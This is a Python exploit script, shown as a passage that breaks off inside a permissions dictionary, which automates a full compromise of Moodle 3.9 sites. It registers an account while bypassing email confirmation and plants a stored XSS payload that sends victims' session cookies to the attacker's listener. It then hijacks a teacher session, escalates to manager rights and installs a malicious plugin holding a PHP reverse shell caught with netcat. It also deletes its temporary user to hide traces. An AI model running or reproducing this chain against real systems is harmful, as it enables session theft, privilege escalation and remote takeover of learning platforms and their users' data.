#!/usr/bin/python3
# Made just for fun by 3mrgnc3
# inspired by POC KIEN HOANG HoangKien1020 https://github.com/HoangKien1020/Moodle_RCE

import argparse, os, requests, http.server, socketserver, zipfile, subprocess
from termcolor import colored as colr
from io import BytesIO

bdr = colr("[+] ","red")
bar = colr("_"*55,"green")

banner = """%s =================== Moodle 3.9 RCE ====================== 
%s =============== Autopwn RevShell Script =================
%s ===================== by 3mrgnc3 ========================
%s ===== Origin credit:Github HoangKien1020/Moodle_RCE =====
%s""" % (bdr,bdr,bdr,bdr,bdr)

print(banner)
# Parse command line arguments
parser = argparse.ArgumentParser()
parser.add_argument("--url", help="The target base url to moodle site. e.g. http://moodle-site.net/moodle/", required=True)
parser.add_argument("--user", help="Temp user name", default="3mrgnc3")
parser.add_argument("--passwd", help="Temp password", default="P@55w0rd123")
parser.add_argument("--email", help="Temp user email", required=True)
parser.add_argument("--lhost", help="listener host ip address", required=True)
parser.add_argument("--lport", help="listener host port for reverse shell", type=int, default=61984)
parser.add_argument("--proxy", help="Optional http proxy eg. http://127.0.0.1:8080")
args = parser.parse_args()

url = args.url 
username = args.user 
password = args.passwd 
email = args.email 
fname = username
lhost = args.lhost 
lport = args.lport 

if args.proxy:
    # used Burp for dev process etc
    proxy = {'http': args.proxy} 
else:
    proxy = ""

webport =  8000
xxsPld = '<img src=x onerror=this.src="http://%s:%s/?"+document.cookie>' %(lhost, str(webport))

#proxy = ""
# Use some default http request headers
headers = requests.utils.default_headers() 
headers.update({ # use a legit looking user agent
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
    })


pluginZip = "revshell.zip" # filename of malicious moodle plugin we will create (Moodle 3.9 RCE POC from: https://github.com/HoangKien1020/Moodle_RCE)
revShell = '<?php $sock=fsockopen("%s",%s);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>' % (lhost,str(lport))
pluginVersion = "<?php $plugin->version = 2020061700; $plugin->component = 'block_rce';"
triggerRevShell = "%sblocks/rce/lang/en/block_rce.php" % url

def buildEvilPlugin():
    zdata = BytesIO()
    z = zipfile.ZipFile(zdata, "w", zipfile.ZIP_DEFLATED)
    z.writestr("rce/version.php", pluginVersion)
    z.writestr("rce/lang/en/block_rce.php", revShell)
    z.close()
    zip = open(pluginZip, 'wb')
    zip.write(zdata.getvalue())
    zip.close()

    if os.path.exists(pluginZip):
        print(bdr,(colr("Plugin file payload: %s created successfully!","green") % pluginZip))
    else:
        print(bdr,(colr("Couldn't create payload: %s! :(","red") % pluginZip))
        exit(-1)

def uploadEvilPlugin(pluginZipFile):
    # get repo upload params
    installAddOnURI = "%sadmin/tool/installaddon/index.php" % url
    res = stolenSession.get(installAddOnURI, headers=headers, proxies=proxy)
    repoid =  res.text.split('"repositories"')[1].split('Upload a file')[0].split('"')[-5]
    sesskey =  res.text.split("sesskey",1)[1].split('"')[2]
    clientid =  res.text.split("client_id",1)[1].split('"')[2]
    itemid =  res.text.split("itemid=")[1].split("&")[0]
    contextid =  res.text.split("contextid")[1].split(":")[1].split(",")[0]
    pluginZipFile = { 'repo_upload_file' : (pluginZip, open(pluginZip,'rb'), 'application/zip')}   
    zipFormData  = {
        "title": pluginZip,
        "author": victimAdmin,
        "license": "unknown",
        "p": "",
        "page": "",
        "env": "filepicker",
        "accepted_types[]": ".zip",
        "repo_id": repoid,
        "sesskey": sesskey,
        "client_id": clientid, 
        "itemid": itemid,
        "maxbytes": -1,
        "areamaxbytes": -1,
        "ctx_id": contextid,
        "savepath": "/"
    } 
    # upload the zipped payload
    uploadURI = "%srepository/repository_ajax.php?action=upload" % url
    res = stolenSession.post(uploadURI, headers=headers, proxies=proxy, files=pluginZipFile, data=zipFormData)
    if pluginZip in res.text:
        print(bdr,colr("Draft upload successful","green"))
    else:
        print(bdr,colr("Draft upload failed :(","red"))
        exit(-1)

    # Validate evil block_rce plugin
    validateData = {
        "sesskey": sesskey,
        "_qf__tool_installaddon_installfromzip_form": 1,
        "mform_showmore_id_general": 0,
        "mform_isexpanded_id_general": 1,
        "zipfile": itemid,
        "plugintype": "block",
        "rootdir": "",
        "submitbutton": "Install plugin from the ZIP file"
    }
    res = stolenSession.post(installAddOnURI, headers=headers, proxies=proxy, data=validateData)
    if "Validation successful" in res.text:
        print(bdr,colr("Plugin Validation successful","green"))
        installzipstorage = res.text.split("installzipstorage")[1].split('"')[2]
    else:
        print(bdr,colr("Plugin Validation failed :(","red"))
        exit(-1)

    installData = {
        "installzipcomponent": "block_rce",
        "installzipstorage": installzipstorage,
        "installzipconfirm": 1,
        "sesskey": sesskey
    }
    res = stolenSession.post(installAddOnURI, headers=headers, proxies=proxy, data=installData)
    if "Server checks" in res.text:
        print(bdr,colr("Plugin Installation successful","green"))
    else:
        print(bdr,colr("Plugin Installation failed :(","red"))
        exit(-1)

def runRevShell():
     # Setup the Netcat listener.
    lnr = "nc -s "+lhost+" -nvlp "+str(lport)
    try:
        print(bdr,colr("Waiting for incoming reverse shell...","white"))
        ncl = subprocess.Popen(lnr, shell=True)
        ncl.poll()
        stolenSession.get(triggerRevShell,headers=headers, proxies=proxy)
        ncl.wait()
    except:    
        print(bdr,"Shell Terminated!")



def register(username, password, email, fname):
    global studentSession, tmpUser
    signupURI = "%slogin/signup.php" % (url)
    print(bdr,"Getting Initial Session Cookie & XSRF Token...")
    studentSession = requests.Session()    
    res = studentSession.get(signupURI, headers=headers, proxies=proxy)
    sesskey =  res.text.split("sesskey",1)[1].split('"')[2]
    regacct = {
        "sesskey": sesskey, 
        "_qf__login_signup_form": 1, 
        "mform_isexpanded_id_createuserandpass": 1, 
        "mform_isexpanded_id_supplyinfo": 1, 
        "username": username, 
        "password": password, 
        "email": email, 
        "email2": email, 
        "firstname": fname, 
        "lastname": "Pwnz", 
        "city": "", 
        "country": "",
        "submitbutton": "Create my new account"
        }

    res = studentSession.post(signupURI, headers=headers, proxies=proxy, data=regacct)
        # on successfully account creation, bypass confirmation email link.
    if "Confirm your account" in res.text:
        print(bdr,"User Account Registered Successfully..")
        confirmKey = res.text.split('name="data" value="',1)[1].split('"')[0]
        print(bdr,"Bypassing account confirmation email link",colr("(CVE-2020–20282)","magenta"))
        confirm = "%slogin/confirm.php?data=%s" % (url, confirmKey)
        res = studentSession.get(confirm, headers=headers, proxies=proxy)
        tmpUser = res.text.split('title="View profile">',1)[1].split("<")[0] 
        if "registration has been confirmed" in res.text:
            print(bdr,"Account Confirmed Successfully..\r\n%s Logged In As %s" % (bdr,colr(tmpUser,"green")))

    # checking for existing account for this user
    elif "username already exists" in res.text:
        print(bdr,"Username already registered!")
        loginPage = "%slogin/index.php" % url
        res = studentSession.get(loginPage, headers=headers, proxies=proxy)
        loginToken = res.text.split("logintoken",1)[1].split('"')[2]
        print(bdr,"Using creds: %s:%s to attempt login" % (colr(username,"green"), colr(password,"green")))
        loginData = {
            "anchor": "",
            "logintoken": loginToken,
            "username": username,
            "password": password
            }
        res = studentSession.post(loginPage, headers=headers, proxies=proxy, data=loginData)
        if "logged in as" in res.text:
            tmpUser = res.text.split("View profile")[1].split(">")[1].split("<")[0]
            print(bdr,"Successfully Logged In As %s" % colr(tmpUser,"green"))
        else:
            print(bdr,"Login Failed! :(")
            exit(0)
    # checking for account creation errors
    elif "email address is already registered" in res.text:
        print(bdr,"Email Address already in use!")
        exit(0)
    elif "password must have" in res.text:
        print(bdr,"Password Not Complex Enough!")
        exit(0)
    else:
        print(bdr,"Something went wrong :(")
        exit(1)

# Print course & teacher info for ech listing
def printCourseInfo(courseData, message, color):
    global staffDict
    if canSelfEnrole:
        global courseTitle, courseID
    courseID = courseData.split('"')[1]
    courseTitle = courseData.split("aalink")[1].split(">")[1].split("<")[0]
    courseTeacher = courseData.split("Teacher:")[1].split(">")[1].split("<")[0]
    teacherID = courseData.split("Teacher:")[1].split("id=")[1].split("&")[0]
    print(colr("%s %s\r\n%s %s %s (courseID = %s)\r\n%s Teacher : %s (teacherID = %s) "
    % (bdr, bar, bdr, message, colr(courseTitle,"green"), colr(courseID,"green"), bdr, colr(courseTeacher,"green"), colr(teacherID,"green")),color))
    staffDict["staff"].append({"teacherID":teacherID,"courseTeacher":courseTeacher,"courseID":courseID,"courseTitle":courseTitle})

# find a course we can self enrole on 
def listCourses():
    global staffDict, canSelfEnrole, enroleCourseID, enrolecourseTitle
    staffDict = {"staff":[]}
    availableCourses = "%s?redirect=0" % (url)
    print(bdr, "Checking available courses and listing teacher details...")
    res = studentSession.get(availableCourses, headers=headers, proxies=proxy)
    canSelfEnrole = False
    for courseData in res.text.split("data-courseid"):
        if "Self enrolment" in courseData:
            canSelfEnrole = True
            printCourseInfo(courseData, colr("Self enrolment enabled!\r\n","magenta")+bdr+" Course: ","green")
            enroleCourseID = courseID
            enrolecourseTitle = courseTitle
        elif "coursename" in courseData:
            printCourseInfo(courseData, "Course  :","cyan")
    print(bdr,bar)   

# check user profile for enroled courses
def checkProfile():
    global userID, sesskey
    profileGet = "%suser/profile.php" % (url)
    res = studentSession.get(profileGet, headers=headers, proxies=proxy)
    userID =  res.text.split("data-userid")[1].split('"')[1]
    sesskey =  res.text.split("sesskey",1)[1].split('"')[2]
    if "Course profiles" in res.text:
        courses = [res.text.split("Course profiles")[1].split("course=")[1]]
        for courseData in courses:
            courseTitle = courseData.split(">")[1].split("<")[0]
            # print(courseData)
            print(bdr,("Already enroled on the %s course!" % colr(courseTitle, "green")))
        # inject xxs payload into MoodleNet Field in user profile
        injectXXS(xxsPld,"pwn")
    else:
        print(bdr,colr("Not currently enroled on a course!", "red"))
        selfEnrole()
    
# enrole on a course
def selfEnrole():
    global userID, sesskey
    enroleOnCourse = "%senrol/index.php" % (url)
    cID = "?id=%s" % enroleCourseID    
    res = studentSession.get(enroleOnCourse+cID, headers=headers, proxies=proxy)
    if "instance" in res.text:
        sesskey =  res.text.split("sesskey",1)[1].split('"')[2]
        instance = res.text.split("instance")[1].split('value="')[1]
    else:
        print(bdr,"Course Enrolment Failed :(")
        exit(0)
    enrlcse = {
        "id": enroleCourseID,
        "instance": instance,
        "sesskey": sesskey, 
        "_qf__12_enrol_self_enrol_form": 1, 
        "mform_isexpanded_id_selfheader": 1, 
        "submitbutton": "Enrol me"
        }

    print(bdr,"Attempting to Self Enroll On Course: %s" % (colr(enrolecourseTitle,"green")))
    res = studentSession.post(enroleOnCourse, headers=headers, proxies=proxy, data=enrlcse)
    userID =  res.text.split("data-userid")[1].split('"')[1]
    if "You are enrolled in the course" in res.text:
        print(bdr,colr("Successfully Enrolled","green"))
        # inject xxs payload into MoodleNet Field in user profile
        injectXXS(xxsPld,"pwn")
    else:
        print(bdr,"Enrolement Failed :(")
        exit(0)

# inject XXS into MoodleID
def injectXXS(xssPayload,mode):
    global userID
    editProfile = "%suser/edit.php" % (url)

    sendXXS = {
        "returnto": "profile",
        "id": userID,
        "sesskey": sesskey,
        "_qf__user_edit_form": 1,
        "firstname": fname,
        "lastname": "Pwnz",
        "email": email,
        "moodlenetprofile": xssPayload,
        "submitbutton": "Update profile"
        }
    if mode == "pwn":
        print(bdr,"Injecting XXS Payload ",colr("(CVE-2020–14320)","magenta"))
    elif mode == "clean":
        print(bdr,"Removing XXS Payload")
    res = studentSession.post(editProfile, headers=headers, proxies=proxy, data=sendXXS)
    userID =  res.text.split("data-userid")[1].split('"')[1]
    if xssPayload in res.text:
        print(bdr,"MoodleNet profile = %s" % colr(xssPayload,"green"))
    else:
        print(bdr,"Injection Failed :(")
        exit(0)

def stealCookie():
    global gotCookie, callBackCount, teacherCookie
    gotCookie = False
    callBackCount = 0
    with Listener((lhost, webport), CookieHandler) as httpd:
        print(bdr,colr("Listening For Callback With MoodleSession Cookie when victim browser visits our MoodleNet profile details"+colr('...', 'white', attrs=['blink']), "white"))
        while not gotCookie:
            httpd.handle_request()
    teacherCookie = callBack.split("=")[1]

class Listener(socketserver.TCPServer):
    # Avoid "address already used" error when frequently restarting the script 
    allow_reuse_address = True

class CookieHandler(http.server.BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        # Turn off http request logging in console
        pass

    def do_GET(self):
        global callBackCount
        # Handle single GET request callback with a valid victim cookie
        global gotCookie, callBack, callBackCount
        callBackCount += 1
        if "MoodleSession" in self.requestline:
            callBack = self.requestline.split("?",1)[1].split(" ")[0]
            print(bdr,colr("Victim Session Token Received!","green"))
            print(bdr,colr("Listener stopped!","red"))
            gotCookie = True
        elif callBackCount >= 6:
            injectXXS(" ", "clean")
            print(bdr,colr("XXS payload removed! Check and re-try exploit!","red"))
            exit(0)
        else:
            print(bdr,colr(("Callback %s did not contain a MoodleSession token :(" % callBackCount),"red"))
            
def hijackSession(MoodleSession):
    global victimUser, stolenSession, gotTeacherSession
    stolenSession = requests.Session()  
    stolenSession.cookies.set("MoodleSession", MoodleSession, domain=url.split("//")[1].split("/")[0])
    # check who's session we are logged in with
    profilePage = "%suser/profile.php" % url
    res = stolenSession.get(profilePage, headers=headers, proxies=proxy)
    if "logged in as" in res.text:
        victimUser = res.text.split("View profile")[1].split(">")[1].split("<")[0]
        for teacher in staffDict["staff"]:
                if teacher["courseTeacher"] == victimUser:
                    gotTeacherSession = True
                    print(bdr,"Successfully hijacked session Of %s" % colr(victimUser,"green"),"(MoodleSession=%s)" % colr(teacherCookie,"green"))
                    injectXXS("3mrgnc3 w@z h3r3!", "clean")
                    break
                else:
                    pass
        if not gotTeacherSession:
            print(bdr,"Non teacher session sent in callback. User: %s" % colr(victimUser,"red"),"(MoodleSession=%s)" % colr(teacherCookie,"red"))

def enroleRequest(userID,roleID):
    enroleURI = "%senrol/manual/ajax.php" % (url)
    params = "?id=%s&action=enrol&enrolid=%s&sesskey=%s&userlist[]=%s&roletoassign=%s" % (courseID,enrolID,sesskey,userID,roleID)
    res = stolenSession.get(enroleURI+params, headers=headers, proxies=proxy)
    if not '"success":true' in res.text:
        print(bdr,colr("Enrolement Failed :(","red"))
        abort = input(("%s Abort? [y/n]: " % bdr))
        if abort == "y":
            quit(0)

def loginAsAdmin(studentRoleID,adminID,sesskey,victimAdmin):
    # attempt to login as the victim admin account from the stolen teacher's session
    loginAs = "%scourse/loginas.php" % url
    params = "?id=%s&user=%s&sesskey=%s" % (studentRoleID,adminID,sesskey)
    res = stolenSession.get(loginAs+params, headers=headers, proxies=proxy)
    confirmed = "You are logged in as " + victimAdmin
    if confirmed in res.text:
        print(bdr,colr(confirmed,"green"))
    else:
        print(bdr,colr("Privesc failed! Aborting!","red"))
        quit()

def deleteTmpUser():
    adminUsersURI = "%sadmin/user.php" % url
    res = stolenSession.get(adminUsersURI, headers=headers, proxies=proxy)
    delLink = res.text.split(tmpUser)[1].split("href=")[1].split('"')[1].replace("amp;","")
    res = stolenSession.get(delLink, headers=headers, proxies=proxy)
    delCfm = res.text.split(tmpUser)[1].split("Delete")[0]
    delCfmParams = {
        "delete": delCfm.split("delete")[1].split('"')[2],
        "confirm": delCfm.split("confirm")[1].split('"')[2],
        "sesskey": delCfm.split("sesskey")[1].split('"')[2]
        }
    res = stolenSession.post(adminUsersURI, headers=headers, proxies=proxy, data=delCfmParams)
    if not tmpUser in res.text:
        print(bdr,colr(("%s account deleted!" % tmpUser),"green"))
    else:
        print(bdr,colr(("%s account NOT deleted! Remove manually!" % tmpUser),"red"))

def elevateToAdmin():
    global adminID, foundID, courseID, teacherID, sesskey, adminRoleID, enrolID, victimAdmin
    foundID = False
    while not foundID:
        try:
            adminID = int(input(("%s Enter a teacherID: " % bdr)))
        except ValueError:
            print(bdr,colr("Not a valid format for teacherID!","red"))
        else:
            for teacher in staffDict["staff"]:
                if teacher["courseTeacher"] == victimUser:
                    courseID = str(teacher["courseID"])
                    teacherID = str(teacher["teacherID"])
                elif int(teacher["teacherID"]) == adminID:
                    foundID = True
                    victimAdmin = teacher["courseTeacher"]
                    print(bdr,"Attempting to privesc using account of",colr(victimAdmin,"green"),colr("(CVE-2020–14321)","magenta"))
                    break
            if not foundID:
                print(bdr,"teacherID not found ",colr("Enter a value from the list above","red"))

    getEnrolID = "%suser/index.php?id=%s" % (url,courseID)
    res = stolenSession.get(getEnrolID, headers=headers, proxies=proxy)
        # Constant Moodle Role Values
    studentRoleID = "5" 
    adminRoleID = "1"
    sesskey = res.text.split("sesskey=")[1].split('"')[0]
    enrolID = res.text.split("enrolid")[1].split('value="')[1].split('"')[0]
    # Enrole an admin account as student to current teacher's course
    enroleRequest(adminID,studentRoleID)
    # Add manager permissions to stolen teacher session
    enroleRequest(teacherID,adminRoleID)
    loginAsAdmin(studentRoleID,adminID,sesskey,victimAdmin)
    deleteTmpUser()

def grantFullPerms():
    global sesskey
    definePermsURI = "%sadmin/roles/define.php?action=edit&roleid=1" % url
    res = stolenSession.get(definePermsURI, headers=headers, proxies=proxy)
    sesskey = res.text.split("sesskey")[1].split('"')[2]

    fullPermsPld = { # CVE-2020-14321 Payload to full permissions https://github.com/HoangKien1020/CVE-2020-14321
            "sesskey":sesskey,
            "return":"manage",
            "resettype":"none",
            "shortname":"manager",
            "name":"",
            "description":"",
            "archetype":"manager",
            "contextlevel10":0,
            "contextlevel10":1,
            "contextlevel30":0,
            "contextlevel30":1,
            "contextlevel40":0,
            "contextlevel40":1,
            "contextlevel50":0,
            "contextlevel50":1,
            "contextlevel70":0,
            "contextlevel70":1,
            "contextlevel80":0,
            "contextlevel80":1,
            "allowassign[]":"",
            "allowassign[]":1,
            "allowassign[]":2,
            "allowassign[]":3,
            "allowassign[]":4,
            "allowassign[]":5,
            "allowassign[]":6,
            "allowassign[]":7,
            "allowassign[]":8,
            "allowoverride[]":"",
            "allowoverride[]":1,
            "allowoverride[]":2,
            "allowoverride[]":3,
            "allowoverride[]":4,
            "allowoverride[]":5,
            "allowoverride[]":6,
            "allowoverride[]":7,
            "allowoverride[]":8,
            "allowswitch[]":"",
            "allowswitch[]":1,
            "allowswitch[]":2,
            "allowswitch[]":3,
            "allowswitch[]":4,
            "allowswitch[]":5,
            "allowswitch[]":6,
            "allowswitch[]":7,
            "allowswitch[]":8,
            "allowview[]":"",
            "allowview[]":1,
            "allowview[]":2,
            "allowview[]":3,
            "allowview[]":4,
            "allowview[]":5,
            "allowview[]":6,
            "allowview[]":7,
            "allowview[]":8,
            "block/admin_bookmarks:myaddinstance":1,
            "block/badges:myaddinstance":1,
            "block/calendar_month:myaddinstance":1,
            "block/calendar_upcoming:myaddinstance":1,
            "block/comments:myaddinstance":1,
            "block/course_list:myaddinstance":1,
            "block/globalsearch:myaddinstance":1,
            "block/glossary_random:myaddinstance":1,
            "block/html:myaddinstance":1,
            "block/lp:addinstance":1,
            "block/lp:myaddinstance":1,
            "block/mentees:myaddinstance":1,
            "block/mnet_hosts:myaddinstance":1,
            "block/myoverview:myaddinstance":1,
            "block/myprofile:myaddinstance":1,
            "block/navigation:myaddinstance":1,
            "block/news_items:myaddinstance":1,
            "block/online_users:myaddinstance":1,
            "block/private_files:myaddinstance":1,
            "block/recentlyaccessedcourses:myaddinstance":1,
            "block/recentlyaccesseditems:myaddinstance":1,
            "block/rss_client:myaddinstance":1,
            "block/settings:myaddinstance":1,
            "block/starredcourses:myaddinstance":1,
            "block/tags:myaddinstance":1,
            "block/timeline:myaddinstance":1,
            "enrol/category:synchronised":1,
            "message/airnotifier:managedevice":1,
            "moodle/analytics:listowninsights":1,
            "moodle/analytics:managemodels":1,
            "moodle/badges:manageglobalsettings":1,
            "moodle/blog:create":1,
            "moodle/blog:manageentries":1,
            "moodle/blog:manageexternal":1,
            "moodle/blog:search":1,
            "moodle/blog:view":1,
            "moodle/blog:viewdrafts":1,
            "moodle/course:configurecustomfields":1,
            "moodle/course:recommendactivity":1,
            "moodle/grade:managesharedforms":1,
            "moodle/grade:sharegradingforms":1,
            "moodle/my:configsyspages":1,
            "moodle/my:manageblocks":1,
            "moodle/portfolio:export":1,
            "moodle/question:config":1,
            "moodle/restore:createuser":1,
            "moodle/role:manage":1,
            "moodle/search:query":1,
            "moodle/site:config":1,
            "moodle/site:configview":1,
            "moodle/site:deleteanymessage":1,
            "moodle/site:deleteownmessage":1,
            "moodle/site:doclinks":1,
            "moodle/site:forcelanguage":1,
            "moodle/site:maintenanceaccess":1,
            "moodle/site:manageallmessaging":1,
            "moodle/site:messageanyuser":1,
            "moodle/site:mnetlogintoremote":1,
            "moodle/site:readallmessages":1,
            "moodle/site:sendmessage":1,
            "moodle/site:uploadusers":1,
            "moodle/site:viewparticipants":1,
            "moodle/tag:edit":1,
            "moodle/tag:editblocks":1,
            "moodle/tag:flag":1,
            "moodle/tag:manage":1,
            "moodle/user:changeownpassword":1,
            "moodle/user:create":1,
            "moodle/user:delete":1,
            "moodle/user:editownmessageprofile":1,
            "moodle/user:editownprofile":1,
            "moodle/user:ignoreuserquota":1,
            "moodle/user:manageownblocks":1,
            "moodle/user:manageownfiles":1,
            "moodle/user:managesyspages":1,
            "moodle/user:update":1,
            "moodle/webservice:createmobiletoken":1,
            "moodle/webservice:createtoken":1,
            "moodle/webservice:managealltokens":1,
            "quizaccess/seb:managetemplates":1,
            "report/courseoverview:view":1,
            "report/performance:view":1,
            "report/questioninstances:view":1,
            "report/security:view":1,
            "report/status:view":1,
            "tool/customlang:edit":1,
            "tool/customlang:view":1,
            "tool/dataprivacy:managedataregistry":1,
            "tool/dataprivacy:managedatarequests":1,
            "tool/dataprivacy:requestdeleteforotheruser":1,
            "tool/lpmigrate:frameworksmigrate":1,
            "tool/monitor:managetool":1,
            "tool/policy:accept":1,
            "tool/policy:managedocs":1,
            "tool/policy:viewacceptances":1,
            "tool/uploaduser:uploaduserpictures":1,
            "tool/usertours:managetours":1,
            "auth/oauth2:managelinkedlogins":1,
            "moodle/badges:manageownbadges":1,
            "moodle/badges:viewotherbadges":1,
            "moodle/competency:evidencedelete":1,
            "moodle/competency:plancomment":1,
            "moodle/competency:plancommentown":1,
            "moodle/competency:planmanage":1,
            "moodle/competency:planmanagedraft":1,
            "moodle/competency:planmanageown":1,
            "moodle/competency:planmanageowndraft":1,
            "moodle/competency:planrequestreview":1,
            "moodle/competency:planrequestreviewown":1,
            "moodle/competency:planreview":1,
            "moodle/competency:planview":1,
            "moodle/competency:planviewdraft":1,
            "moodle/competency:planviewown":1,
            "moodle/competency:planviewowndraft":1,
            "moodle/competency:usercompetencycomment":1,
            "moodle/competency:usercompetencycommentown":1,
            "moodle/competency:usercompetencyrequestreview":1,
            "moodle/competency:usercompetencyrequestreviewown":1,
            "moodle/competency:usercompetencyreview":1,
            "moodle/competency:usercompetencyview":1,
            "moodle/competency:userevidencemanage":1,
            "moodle/competency:userevidencemanageown":0,
            "moodle/competency:userevidenceview":1,
            "moodle/user:editmessageprofile":1,
            "moodle/user:editprofile":1,
            "moodle/user:manageblocks":1,
            "moodle/user:readuserblogs":1,
            "moodle/user:readuserposts":1,
            "moodle/user:viewalldetails":1,
            "moodle/user:viewlastip":1,
            "moodle/user:viewuseractivitiesreport":1,
            "report/usersessions:manageownsessions":1,
            "tool/dataprivacy:downloadallrequests":1,
            "tool/dataprivacy:downloadownrequest":1,
            "tool/dataprivacy:makedatadeletionrequestsforchildren":1,
            "tool/dataprivacy:makedatarequestsforchildren":1,
            "tool/dataprivacy:requestdelete":1,
            "tool/policy:acceptbehalf":1,
            "moodle/category:manage":1,
            "moodle/category:viewcourselist":1,
            "moodle/category:viewhiddencategories":1,
            "moodle/cohort:assign":1,
            "moodle/cohort:manage":1,
            "moodle/competency:competencymanage":1,
            "moodle/competency:competencyview":1,
            "moodle/competency:templatemanage":1,
            "moodle/competency:templateview":1,
            "moodle/course:create":1,
            "moodle/course:request":1,
            "moodle/site:approvecourse":1,
            "repository/contentbank:accesscoursecategorycontent":1,
            "repository/contentbank:accessgeneralcontent":1,
            "block/recent_activity:viewaddupdatemodule":1,
            "block/recent_activity:viewdeletemodule":1,
            "contenttype/h5p:access":1,
            "contenttype/h5p:upload":1,
            "contenttype/h5p:useeditor":1,
            "enrol/category:config":1,
            "enrol/cohort:config":1,
            "enrol/cohort:unenrol":1,
            "enrol/database:config":1,
            "enrol/database:unenrol":1,
            "enrol/flatfile:manage":1,
            "enrol/flatfile:unenrol":1,
            "enrol/guest:config":1,
            "enrol/imsenterprise:config":1,
            "enrol/ldap:manage":1,
            "enrol/lti:config":1,
            "enrol/lti:unenrol":1,
            "enrol/manual:config":1,
            "enrol/manual:enrol":1,
            "enrol/manual:manage":1,
            "enrol/manual:unenrol":1,
            "enrol/manual:unenrolself":1,
            "enrol/meta:config":1,
            "enrol/meta:selectaslinked":1,
            "enrol/meta:unenrol":1,
            "enrol/mnet:config":1,
            "enrol/paypal:config":1,
            "enrol/paypal:manage":1,
            "enrol/paypal:unenrol":1,
            "enrol/paypal:unenrolself":1,
            "enrol/self:config":1,
            "enrol/self:holdkey":1,
            "enrol/self:manage":1,
            "enrol/self:unenrol":1,
            "enrol/self:unenrolself":1,
            "gradeexport/ods:publish":1,
            "gradeexport/ods:view":1,
            "gradeexport/txt:publish":1,
            "gradeexport/txt:view":1,
            "gradeexport/xls:publish":1,
            "gradeexport/xls:view":1,
            "gradeexport/xml:publish":1,
            "gradeexport/xml:view":1,
            "gradeimport/csv:view":1,
            "gradeimport/direct:view":1,
            "gradeimport/xml:publish":1,
            "gradeimport/xml:view":1,
            "gradereport/grader:view":1,
            "gradereport/history:view":1,
            "gradereport/outcomes:view":1,
            "gradereport/overview:view":1,
            "gradereport/singleview:view":1,
            "gradereport/user:view":1,
            "mod/assign:addinstance":1,
            "mod/assignment:addinstance":1,
            "mod/book:addinstance":1,
            "mod/chat:addinstance":1,
            "mod/choice:addinstance":1,
            "mod/data:addinstance":1,
            "mod/feedback:addinstance":1,
            "mod/folder:addinstance":1,
            "mod/forum:addinstance":1,
            "mod/glossary:addinstance":1,
            "mod/h5pactivity:addinstance":1,
            "mod/imscp:addinstance":1,
            "mod/label:addinstance":1,
            "mod/lesson:addinstance":1,
            "mod/lti:addcoursetool":1,
            "mod/lti:addinstance":1,
            "mod/lti:addmanualinstance":1,
            "mod/lti:addpreconfiguredinstance":1,
            "mod/lti:requesttooladd":1,
            "mod/page:addinstance":1,
            "mod/quiz:addinstance":1,
            "mod/resource:addinstance":1,
            "mod/scorm:addinstance":1,
            "mod/survey:addinstance":1,
            "mod/url:addinstance":1,
            "mod/wiki:addinstance":1,
            "mod/workshop:addinstance":1,
            "moodle/analytics:listinsights":1,
            "moodle/backup:anonymise":1,
            "moodle/backup:backupcourse":1,
            "moodle/backup:backupsection":1,
            "moodle/backup:backuptargetimport":1,
            "moodle/backup:configure":1,
            "moodle/backup:downloadfile":1,
            "moodle/backup:userinfo":1,
            "moodle/badges:awardbadge":1,
            "moodle/badges:configurecriteria":1,
            "moodle/badges:configuredetails":1,
            "moodle/badges:configuremessages":1,
            "moodle/badges:createbadge":1,
            "moodle/badges:deletebadge":1,
            "moodle/badges:earnbadge":1,
            "moodle/badges:revokebadge":1,
            "moodle/badges:viewawarded":1,
            "moodle/badges:viewbadges":1,
            "moodle/calendar:manageentries":1,
            "moodle/calendar:managegroupentries":1,
            "moodle/calendar:manageownentries":1,
            "moodle/cohort:view":1,
            "moodle/comment:delete":1,
            "moodle/comment:post":1,
            "moodle/comment:view":1,
            "moodle/competency:competencygrade":1,
            "moodle/competency:coursecompetencygradable":1,
            "moodle/competency:coursecompetencymanage":1,
            "moodle/competency:coursecompetencyview":1,
            "moodle/contentbank:access":1,
            "moodle/contentbank:deleteanycontent":1,
            "moodle/contentbank:deleteowncontent":1,
            "moodle/contentbank:manageanycontent":1,
            "moodle/contentbank:manageowncontent":1,
            "moodle/contentbank:upload":1,
            "moodle/contentbank:useeditor":1,
            "moodle/course:bulkmessaging":1,
            "moodle/course:changecategory":1,
            "moodle/course:changefullname":1,
            "moodle/course:changeidnumber":1,
            "moodle/course:changelockedcustomfields":1,
            "moodle/course:changeshortname":1,
            "moodle/course:changesummary":1,
            "moodle/course:creategroupconversations":1,
            "moodle/course:delete":1,
            "moodle/course:enrolconfig":1,
            "moodle/course:enrolreview":1,
            "moodle/course:ignorefilesizelimits":1,
            "moodle/course:isincompletionreports":1,
            "moodle/course:managefiles":1,
            "moodle/course:managegroups":1,
            "moodle/course:managescales":1,
            "moodle/course:markcomplete":1,
            "moodle/course:movesections":1,
            "moodle/course:overridecompletion":1,
            "moodle/course:renameroles":1,
            "moodle/course:reset":1,
            "moodle/course:reviewotherusers":1,
            "moodle/course:sectionvisibility":1,
            "moodle/course:setcurrentsection":1,
            "moodle/course:setforcedlanguage":1,
            "moodle/course:tag":1,
            "moodle/course:update":1,
            "moodle/course:useremail":1,
            "moodle/course:view":1,
            "moodle/course:viewhiddencourses":1,
            "moodle/course:viewhiddensections":1,
            "moodle/course:viewhiddenuserfields":1,
            "moodle/course:viewparticipants":1,
            "moodle/course:viewscales":1,
            "moodle/course:viewsuspendedusers":1,
            "moodle/course:visibility":1,
            "moodle/filter:manage":1,
            "moodle/grade:edit":1,
            "moodle/grade:export":1,
            "moodle/grade:hide":1,
            "moodle/grade:import":1,
            "moodle/grade:lock":1,
            "moodle/grade:manage":1,
            "moodle/grade:managegradingforms":1,
            "moodle/grade:manageletters":1,
            "moodle/grade:manageoutcomes":1,
            "moodle/grade:unlock":1,
            "moodle/grade:view":1,
            "moodle/grade:viewall":1,
            "moodle/grade:viewhidden":1,
            "moodle/notes:manage":1,
            "moodle/notes:view":1,
            "moodle/question:add":1,
            "moodle/question:editall":1,
            "moodle/question:editmine":1,
            "moodle/question:flag":1,
            "moodle/question:managecategory":1,
            "moodle/question:moveall":1,
            "moodle/question:movemine":1,
            "moodle/question:tagall":1,
            "moodle/question:tagmine":1,
            "moodle/question:useall":1,
